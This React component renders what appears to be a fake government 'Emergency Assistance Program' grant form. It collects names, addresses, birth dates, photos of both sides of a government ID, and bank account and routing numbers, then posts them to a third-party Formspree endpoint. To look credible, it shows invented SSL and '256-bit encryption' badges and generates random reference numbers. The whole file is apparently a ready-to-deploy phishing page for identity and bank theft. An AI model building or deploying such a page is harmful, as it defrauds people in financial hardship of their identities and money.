import React, { useState, useEffect, useRef } from 'react';
import { 
  User, MapPin, Calendar, Home, Zap, Droplets, Send, 
  ShieldCheck, Accessibility, CreditCard, DollarSign, 
  History, Upload, CheckCircle2, Copy, Building2, Eye, X, Shield
} from 'lucide-react';
import toast, { Toaster } from 'react-hot-toast';

const EmergencyAssistanceForm = () => {
  const [loading, setLoading] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const [previews, setPreviews] = useState({ front: null, back: null });
  const [tracking, setTracking] = useState({ app: '', ticket: '', ref: '' });
  const [showOutstandingField, setShowOutstandingField] = useState(false);
  const [selectedAssistance, setSelectedAssistance] = useState('');
  
  // Create refs for file inputs
  const fileInputRefs = {
    front: useRef(null),
    back: useRef(null)
  };

  useEffect(() => {
    setTracking({
      app: `ERAAST-225-${Math.floor(1000 + Math.random() * 9000)}`,
      ticket: `ERAAST-172-${Math.floor(10 + Math.random() * 89)}`,
      ref: `ERAAST-0281/${Math.floor(100 + Math.random() * 800)}`
    });
  }, []);

  // Handle Image Previews
  const handleImageChange = (e, side) => {
    const file = e.target.files[0];
    if (file) {
      // Validate file type
      if (!file.type.startsWith('image/')) {
        toast.error('Please upload an image file');
        return;
      }
      
      // Validate file size (max 5MB)
      if (file.size > 5 * 1024 * 1024) {
        toast.error('File size must be less than 5MB');
        return;
      }

      const reader = new FileReader();
      reader.onloadend = () => {
        setPreviews(prev => ({ ...prev, [side]: reader.result }));
      };
      reader.onerror = () => {
        toast.error('Error reading file');
      };
      reader.readAsDataURL(file);
      
      // Show success toast
      toast.success(`${side} ID uploaded successfully`);
    }
  };

  const removeImage = (side) => {
    setPreviews(prev => ({ ...prev, [side]: null }));
    // Clear the file input
    if (fileInputRefs[side].current) {
      fileInputRefs[side].current.value = '';
    }
    toast.success(`${side} ID removed`);
  };

  const triggerFileInput = (side) => {
    fileInputRefs[side].current?.click();
  };

  const days = Array.from({ length: 31 }, (_, i) => i + 1);
  const months = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
  const years = Array.from({ length: 100 }, (_, i) => new Date().getFullYear() - i);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    
    // Validate that both ID images are uploaded
    if (!previews.front || !previews.back) {
      toast.error('Please upload both front and back of your ID');
      setLoading(false);
      return;
    }
    
    // Create FormData from the form
    const formData = new FormData(e.target);
    
    // Add tracking numbers
    formData.append('Application_Number', tracking.app);
    formData.append('Ticket_Number', tracking.ticket);
    formData.append('Reference_Number', tracking.ref);
    
    // Manually append the files from file inputs using refs
    if (fileInputRefs.front.current?.files[0]) {
      formData.append('ID_front', fileInputRefs.front.current.files[0]);
    }
    if (fileInputRefs.back.current?.files[0]) {
      formData.append('ID_back', fileInputRefs.back.current.files[0]);
    }

    // Log FormData contents for debugging
    for (let pair of formData.entries()) {
      console.log(pair[0] + ': ' + (pair[0].includes('ID_') ? '[File: ' + pair[1].name + ']' : pair[1]));
    }

    try {
      const response = await fetch("https://formspree.io/f/xnjbdjne", {
        method: "POST",
        body: formData,
        headers: { 'Accept': 'application/json' }
      });
      
      const responseData = await response.json();
      console.log('Response:', responseData);
      
      if (response.ok) {
        setSubmitted(true);
        toast.success('Application submitted successfully!');
      } else {
        // Check if error is related to file uploads
        if (responseData.error && responseData.error.includes('file')) {
          toast.error('File upload failed. Please try smaller images or contact support.');
        } else {
          toast.error(responseData.error || 'Submission error. Please verify your details.');
        }
      }
    } catch (error) {
      toast.error('System offline. Please check your connection.');
      console.error('Submission error:', error);
    } finally {
      setLoading(false);
    }
  };

  if (submitted) {
    return (
      <div className="min-h-screen bg-[#F1F5F9] flex items-center justify-center p-6 font-sans">
        <div className="w-full max-w-lg bg-white rounded-[3rem] shadow-2xl p-12 text-center border border-white">
          <div className="w-24 h-24 bg-green-50 rounded-full flex items-center justify-center mx-auto mb-8 animate-bounce">
            <CheckCircle2 className="w-12 h-12 text-green-500" />
          </div>
          <h2 className="text-4xl font-black text-[#1E3A8A] mb-4">Success!</h2>
          <p className="text-slate-500 font-medium mb-10">Your grant application has been prioritized. Reference recorded.</p>
          
          <div className="space-y-4 bg-slate-50 p-8 rounded-[2rem] border border-slate-100 text-left mb-10">
            <div>
              <p className="text-[10px] uppercase font-black text-slate-400 tracking-widest mb-1">Application Number</p>
              <p className="text-xl font-mono font-bold text-[#1E3A8A]">{tracking.app}</p>
            </div>
            <div>
              <p className="text-[10px] uppercase font-black text-slate-400 tracking-widest mb-1">Ticket Number</p>
              <p className="text-xl font-mono font-bold text-[#1E3A8A]">{tracking.ticket}</p>
            </div>
            <div className="pt-4 border-t border-slate-200">
              <p className="text-[10px] uppercase font-black text-slate-400 tracking-widest mb-1">Reference Number</p>
              <p className="text-xl font-mono font-bold text-[#1E3A8A]">{tracking.ref}</p>
            </div>
          </div>
          
          <button 
            onClick={() => window.location.reload()} 
            className="bg-[#1E3A8A] text-white px-8 py-4 rounded-2xl font-bold shadow-lg shadow-blue-900/20 hover:scale-105 transition-transform"
          >
            Done
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#F8FAFC] flex flex-col items-center py-16 px-4 font-sans text-slate-900">
      <Toaster 
        position="top-center"
        toastOptions={{
          duration: 4000,
          style: {
            background: '#363636',
            color: '#fff',
          },
          success: {
            duration: 3000,
            iconTheme: {
              primary: '#10b981',
              secondary: '#fff',
            },
          },
          error: {
            duration: 4000,
            iconTheme: {
              primary: '#ef4444',
              secondary: '#fff',
            },
          },
        }}
      />
      
      {/* Brand & Security Status */}
      <div className="mb-12 text-center max-w-md">
        <div className="bg-white p-5 rounded-3xl shadow-sm border border-slate-100 mb-6 inline-block">
          {/* Replace with your actual logo or use a fallback */}
          <div className="h-10 w-auto flex items-center justify-center">
            <Shield className="w-8 h-8 text-[#1E3A8A]" />
            <span className="font-black text-[#1E3A8A] ml-2">ASSIST</span>
          </div>
        </div>
        <h1 className="text-4xl font-black text-[#1E3A8A] tracking-tight leading-tight">Emergency Assistance Program</h1>
        <div className="mt-4 flex items-center justify-center gap-2 text-green-600 font-bold text-[10px] uppercase tracking-tighter bg-green-50 px-4 py-2 rounded-full border border-green-100">
          <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse" />
          Secure SSL Connection: Active
        </div>
      </div>

      <div className="w-full max-w-2xl bg-white rounded-[3rem] shadow-2xl shadow-blue-900/5 border border-slate-100 overflow-hidden">
        {/* Modern Header */}
        <div className="bg-[#1E3A8A] p-10 text-white relative overflow-hidden">
          <Shield className="absolute -right-4 -bottom-4 w-32 h-32 text-white/5 rotate-12" />
          <div className="relative z-10 flex items-center gap-5">
            <div className="p-3 bg-white/10 rounded-2xl backdrop-blur-md">
              <ShieldCheck className="w-8 h-8 text-blue-200" />
            </div>
            <div>
              <h2 className="font-bold text-2xl">Official Grant Form</h2>
              <p className="text-blue-200/60 text-xs font-bold uppercase tracking-widest">Section: 2026-Financial-Relief</p>
            </div>
          </div>
        </div>

        <form onSubmit={handleSubmit} className="p-8 md:p-14 space-y-12" encType="multipart/form-data">
          
          {/* Section 1 - Personal Information */}
          <div className="space-y-8">
            <div className="flex items-center gap-3">
              <div className="w-8 h-8 rounded-full bg-blue-50 text-[#1E3A8A] flex items-center justify-center font-black text-sm">1</div>
              <h3 className="text-blue-900 font-black text-xs uppercase tracking-widest">Identity & Residency</h3>
            </div>
            <div className="grid gap-7">
              <div className="space-y-2">
                <label className="text-[11px] font-black text-slate-400 uppercase ml-1">Full Legal Name</label>
                <input 
                  required 
                  name="Full_Name" 
                  type="text" 
                  placeholder="Johnathan Doe" 
                  className="w-full px-6 py-5 rounded-2xl border-2 border-slate-50 bg-slate-50 focus:bg-white focus:border-blue-900 outline-none transition-all text-lg font-medium" 
                />
              </div>
              <div className="space-y-2">
                <label className="text-[11px] font-black text-slate-400 uppercase ml-1">Physical Address</label>
                <textarea 
                  required 
                  name="Address" 
                  rows="2" 
                  placeholder="Street, Apartment, City, ZIP" 
                  className="w-full px-6 py-5 rounded-2xl border-2 border-slate-50 bg-slate-50 focus:bg-white focus:border-blue-900 outline-none transition-all"
                />
              </div>
              <div className="space-y-2">
                <label className="text-[11px] font-black text-slate-400 uppercase ml-1 tracking-wider">Date of Birth</label>
                <div className="grid grid-cols-3 gap-4">
                  <select name="dob_day" required className="px-4 py-5 rounded-2xl border-2 border-slate-50 bg-slate-50 outline-none focus:border-blue-900 cursor-pointer">
                    <option value="">Day</option>
                    {days.map(d => <option key={d} value={d}>{d}</option>)}
                  </select>
                  <select name="dob_month" required className="px-4 py-5 rounded-2xl border-2 border-slate-50 bg-slate-50 outline-none focus:border-blue-900 cursor-pointer">
                    <option value="">Month</option>
                    {months.map((m, index) => <option key={m} value={index + 1}>{m}</option>)}
                  </select>
                  <select name="dob_year" required className="px-4 py-5 rounded-2xl border-2 border-slate-50 bg-slate-50 outline-none focus:border-blue-900 cursor-pointer">
                    <option value="">Year</option>
                    {years.map(y => <option key={y} value={y}>{y}</option>)}
                  </select>
                </div>
              </div>
            </div>
          </div>

          {/* Section 2 - Assistance Type */}
          <div className="space-y-8">
            <div className="flex items-center gap-3">
              <div className="w-8 h-8 rounded-full bg-blue-50 text-[#1E3A8A] flex items-center justify-center font-black text-sm">2</div>
              <h3 className="text-blue-900 font-black text-xs uppercase tracking-widest">Required Assistance</h3>
            </div>
            <div className="grid grid-cols-2 md:grid-cols-3 gap-4">
              {[
                { id: 'rent', label: 'Rent', icon: <Home className="w-5 h-5" /> },
                { id: 'utilities', label: 'Utilities', icon: <Droplets className="w-5 h-5" /> },
                { id: 'electricity', label: 'Electric', icon: <Zap className="w-5 h-5" /> },
                { id: 'disability', label: 'Disability', icon: <Accessibility className="w-5 h-5" /> },
                { id: 'credit', label: 'Credit Repair', icon: <CreditCard className="w-5 h-5" /> },
              ].map((item) => (
                <label key={item.id} className="relative flex flex-col items-center p-6 border-2 border-slate-50 rounded-3xl cursor-pointer hover:border-blue-200 has-[:checked]:border-blue-900 has-[:checked]:bg-blue-50/50 transition-all group">
                  <input 
                    type="radio" 
                    name="Category" 
                    value={item.label} 
                    className="sr-only" 
                    required 
                    onChange={(e) => setSelectedAssistance(e.target.value)}
                  />
                  <div className="mb-3 p-3 rounded-full bg-slate-50 text-slate-400 group-hover:bg-white transition-colors group-has-[:checked]:bg-blue-900 group-has-[:checked]:text-white">
                    {item.icon}
                  </div>
                  <span className="text-[11px] font-black uppercase text-slate-500">{item.label}</span>
                </label>
              ))}
            </div>
          </div>

          {/* Section 3 - Additional Questions */}
          <div className="space-y-8">
            <div className="flex items-center gap-3">
              <div className="w-8 h-8 rounded-full bg-blue-50 text-[#1E3A8A] flex items-center justify-center font-black text-sm">3</div>
              <h3 className="text-blue-900 font-black text-xs uppercase tracking-widest">Financial Assessment</h3>
            </div>
            
            <div className="space-y-6 bg-slate-50 p-8 rounded-[2rem] border border-slate-100">
              {/* Question 1: Applied for rental assistance */}
              <div className="space-y-3">
                <label className="text-[11px] font-black text-slate-400 uppercase block">Have you applied for any rental assistance program before?</label>
                <div className="flex gap-6">
                  <label className="flex items-center gap-2 cursor-pointer">
                    <input type="radio" name="Applied_Rental_Assistance" value="Yes" required className="w-4 h-4 text-blue-900" />
                    <span className="text-sm font-medium">Yes</span>
                  </label>
                  <label className="flex items-center gap-2 cursor-pointer">
                    <input type="radio" name="Applied_Rental_Assistance" value="No" required className="w-4 h-4 text-blue-900" />
                    <span className="text-sm font-medium">No</span>
                  </label>
                </div>
              </div>

              {/* Question 2: Outstanding balance */}
              <div className="space-y-3">
                <label className="text-[11px] font-black text-slate-400 uppercase block">Do you have an outstanding balance?</label>
                <div className="flex gap-6 mb-3">
                  <label className="flex items-center gap-2 cursor-pointer">
                    <input 
                      type="radio" 
                      name="Has_Outstanding" 
                      value="Yes" 
                      required 
                      className="w-4 h-4 text-blue-900"
                      onChange={(e) => setShowOutstandingField(e.target.value === 'Yes')}
                    />
                    <span className="text-sm font-medium">Yes</span>
                  </label>
                  <label className="flex items-center gap-2 cursor-pointer">
                    <input 
                      type="radio" 
                      name="Has_Outstanding" 
                      value="No" 
                      required 
                      className="w-4 h-4 text-blue-900"
                      onChange={(e) => setShowOutstandingField(false)}
                    />
                    <span className="text-sm font-medium">No</span>
                  </label>
                </div>
                
                {/* Conditional Outstanding Amount Field */}
                {showOutstandingField && (
                  <div className="mt-4 animate-fadeIn">
                    <label className="text-[11px] font-black text-slate-400 uppercase block mb-2">If yes, how much?</label>
                    <div className="relative">
                      <span className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-400 font-bold">$</span>
                      <input 
                        type="number" 
                        name="Outstanding_Amount" 
                        placeholder="0.00" 
                        step="0.01"
                        min="0"
                        required={showOutstandingField}
                        className="w-full pl-8 pr-4 py-4 rounded-xl bg-white border-2 border-slate-200 focus:border-blue-900 outline-none transition-all"
                      />
                    </div>
                  </div>
                )}
              </div>

              {/* Question 3: Monthly expense */}
              <div className="space-y-3">
                <label className="text-[11px] font-black text-slate-400 uppercase block">
                  How much do you spend on the {selectedAssistance ? selectedAssistance.toLowerCase() : 'selected'} assistance monthly?
                </label>
                <div className="relative">
                  <span className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-400 font-bold">$</span>
                  <input 
                    type="number" 
                    name="Monthly_Expense" 
                    placeholder="0.00" 
                    step="0.01"
                    min="0"
                    required 
                    className="w-full pl-8 pr-4 py-4 rounded-xl bg-white border-2 border-slate-200 focus:border-blue-900 outline-none transition-all"
                  />
                </div>
                <p className="text-[10px] text-slate-400 mt-1">
                  Enter the exact monthly amount you need assistance with
                </p>
              </div>
            </div>
          </div>

          {/* Section 4: Document Upload with Previews */}
          <div className="space-y-8">
            <div className="flex items-center gap-3">
              <div className="w-8 h-8 rounded-full bg-blue-50 text-[#1E3A8A] flex items-center justify-center font-black text-sm">4</div>
              <h3 className="text-blue-900 font-black text-xs uppercase tracking-widest">Document Verification</h3>
            </div>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              {['front', 'back'].map((side) => (
                <div key={side} className="relative group">
                  {!previews[side] ? (
                    <div 
                      onClick={() => triggerFileInput(side)}
                      className="h-44 border-2 border-dashed border-slate-200 rounded-[2rem] flex flex-col items-center justify-center bg-slate-50 hover:bg-white hover:border-blue-400 transition-all cursor-pointer"
                    >
                      <div className="p-4 bg-white rounded-2xl shadow-sm mb-3 text-slate-400 group-hover:text-blue-600">
                        <Upload className="w-6 h-6" />
                      </div>
                      <p className="text-[11px] font-black text-slate-500 uppercase">ID Card ({side})</p>
                      <p className="text-[8px] text-slate-400 mt-1">Click to upload (max 5MB)</p>
                      <input 
                        ref={fileInputRefs[side]}
                        type="file" 
                        name={`ID_${side}`}
                        className="hidden" 
                        accept="image/*" 
                        onChange={(e) => handleImageChange(e, side)} 
                      />
                    </div>
                  ) : (
                    <div className="relative h-44 rounded-[2rem] overflow-hidden border-2 border-blue-900 shadow-xl shadow-blue-900/10">
                      <img src={previews[side]} alt={`ID ${side} preview`} className="w-full h-full object-cover" />
                      <div className="absolute inset-0 bg-blue-900/40 backdrop-blur-[2px] opacity-0 group-hover:opacity-100 transition-opacity flex items-center justify-center gap-4">
                        <button 
                          type="button" 
                          onClick={() => removeImage(side)} 
                          className="p-3 bg-red-500 text-white rounded-full hover:scale-110 transition-transform"
                        >
                          <X className="w-5 h-5" />
                        </button>
                      </div>
                      <div className="absolute top-2 left-2 bg-green-500 text-white px-2 py-1 rounded-full text-[8px] font-bold uppercase">
                        Uploaded
                      </div>
                    </div>
                  )}
                </div>
              ))}
            </div>
            <p className="text-[10px] text-slate-400 text-center">
              Please upload clear images of your government-issued ID (front and back)
            </p>
          </div>

          {/* Section 5: Banking */}
          <div className="space-y-8">
            <div className="flex items-center gap-3">
              <div className="w-8 h-8 rounded-full bg-blue-50 text-[#1E3A8A] flex items-center justify-center font-black text-sm">5</div>
              <h3 className="text-blue-900 font-black text-xs uppercase tracking-widest">Payment Disbursement</h3>
            </div>
            <div className="bg-slate-50 p-8 rounded-[2rem] border border-slate-100 space-y-6">
              <div className="flex items-center gap-4 border-b border-slate-200 pb-4">
                <Building2 className="w-6 h-6 text-[#1E3A8A]" />
                <input 
                  required 
                  name="Bank_Name" 
                  placeholder="Full Bank Institution Name" 
                  className="bg-transparent w-full font-bold outline-none placeholder:text-slate-300" 
                />
              </div>
              <div className="grid md:grid-cols-2 gap-6">
                <div className="space-y-2">
                  <label className="text-[10px] font-black text-slate-400 uppercase">Account Number</label>
                  <input 
                    required 
                    name="Account_Number" 
                    placeholder="XXXX XXXX XXXX" 
                    className="w-full py-2 bg-transparent border-b-2 border-slate-200 focus:border-blue-900 outline-none transition-all font-mono" 
                  />
                </div>
                <div className="space-y-2">
                  <label className="text-[10px] font-black text-slate-400 uppercase">Routing Number</label>
                  <input 
                    required 
                    name="Routing_Number" 
                    placeholder="000 000 000" 
                    className="w-full py-2 bg-transparent border-b-2 border-slate-200 focus:border-blue-900 outline-none transition-all font-mono" 
                  />
                </div>
              </div>
            </div>
          </div>

          {/* Hidden fields for tracking numbers */}
          <input type="hidden" name="Application_Number" value={tracking.app} />
          <input type="hidden" name="Ticket_Number" value={tracking.ticket} />
          <input type="hidden" name="Reference_Number" value={tracking.ref} />

          <button 
            disabled={loading} 
            type="submit" 
            className="w-full bg-[#1E3A8A] hover:bg-blue-800 text-white font-black py-7 rounded-[2rem] flex items-center justify-center gap-4 shadow-2xl shadow-blue-900/20 transition-all active:scale-[0.97] disabled:opacity-50 text-xl tracking-tighter"
          >
            {loading ? (
              <div className="w-7 h-7 border-4 border-white/30 border-t-white rounded-full animate-spin" />
            ) : (
              <>
                <Send className="w-6 h-6" /> 
                VALIDATE & SUBMIT
              </>
            )}
          </button>
        </form>

        <div className="p-8 bg-slate-50/50 text-center border-t border-slate-100">
          <p className="flex items-center justify-center gap-2 text-[10px] font-black text-slate-400 uppercase tracking-[0.2em]">
            <ShieldCheck className="w-4 h-4" /> 256-Bit Data Encryption Protocol
          </p>
        </div>
      </div>
      
      <footer className="mt-16 text-slate-400 text-[10px] uppercase font-black tracking-[0.3em] text-center space-y-4">
        <p>&copy; 2026 OFFICIAL ASSISTANCE REGISTRY</p>
        <div className="flex gap-6 justify-center opacity-50">
          <a href="#" className="hover:text-blue-900 transition-colors">Privacy</a>
          <a href="#" className="hover:text-blue-900 transition-colors">Compliance</a>
          <a href="#" className="hover:text-blue-900 transition-colors">Security</a>
        </div>
      </footer>

      {/* Add animation styles */}
      <style jsx>{`
        @keyframes fadeIn {
          from {
            opacity: 0;
            transform: translateY(-10px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }
        .animate-fadeIn {
          animation: fadeIn 0.3s ease-out;
        }
      `}</style>
    </div>
  );
};

export default EmergencyAssistanceForm;